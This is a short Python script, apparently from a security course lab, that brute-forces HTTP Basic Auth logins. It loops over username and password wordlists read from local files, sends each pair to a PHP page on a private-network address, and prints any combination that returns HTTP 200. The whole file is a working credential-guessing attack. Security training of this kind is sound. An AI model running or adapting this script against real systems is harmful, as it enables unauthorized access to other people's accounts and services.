#!/usr/bin/env python3
#user/pass brute force program

import requests
from requests.auth import HTTPBasicAuth

usernames = open('/Users/owen/Documents/Flatiron/projects/usernames')
passwords = open('/Users/owen/Documents/Flatiron/projects/passwords')
usernames = usernames.read().split('\n')
passwords = passwords.read().split('\n')
count = 0

for user in usernames:
    for password in passwords:
        response = requests.get('http://172.16.224.166/phptest.php',
            auth = HTTPBasicAuth(user, password))
        count += 1
        if response.status_code == 200:
            print(f'{user}:{password} {response}')
print(str(count) + ' tries')